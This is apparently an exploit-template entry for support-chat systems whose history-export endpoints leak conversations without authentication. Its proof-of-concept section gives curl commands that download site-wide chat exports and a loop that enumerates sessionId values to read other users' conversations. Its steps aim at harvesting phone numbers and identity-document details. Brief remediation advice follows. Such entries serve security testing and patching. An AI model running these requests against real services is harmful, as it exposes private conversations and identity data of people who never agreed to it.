---
title: Unauthenticated support-chat exports (site-wide conversations and identity documents)
cve: None (business logic)
severity: high
cvss: 8.4
product: Custom support system (live chat / tickets / IM)
versions: Any
ports: 80, 443
keywords: support, chat history, export, unauthenticated, conversations, im
entry: /api/cs/history/export  /api/im/sessions
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

```
GET /api/cs/sessions?page=1
GET /api/cs/history?sessionId=
GET /api/cs/history/export?start=&end=
```

## Prerequisites

- Any member account (or completely unauthenticated access).

## PoC

```bash
# 1) Try without authentication first
curl -s 'https://target/api/cs/history/export?startDate=2026-01-01&endDate=2026-01-31' -o /tmp/cs.zip -w '%{http_code} %{size_download}\n'
unzip -l /tmp/cs.zip | head
# Result: 200 and txt/csv conversations in the zip = confirmed

# 2) Fetch other users' conversations with a regular member token
curl -s 'https://target/api/cs/history?sessionId=10001' -H "Authorization: Bearer <t>" | head -c 300

# 3) Enumerate sessionId
for i in $(seq 10001 10010); do
  curl -s "https://target/api/cs/history?sessionId=$i" -H "Authorization: Bearer <t>" | head -c 80; echo
done
```

## Exploitation Steps

1. First try exporting without authentication (most common);
2. Then enumerate sessionId with a regular token and check for other users' phone numbers/identity-document descriptions;
3. Success means "site-wide support conversation disclosure" — often including verbally provided identity/card details;
4. Evidence: HTTP headers + zip listing (without opening the contents).

## Remediation and Mitigation

- Restrict exports to superadmins + step-up authentication; filter conversations by agent/member ownership;
- Mask sensitive content (middle digits of phone/card numbers).

## References

- OWASP API1/API5；CWE-639。
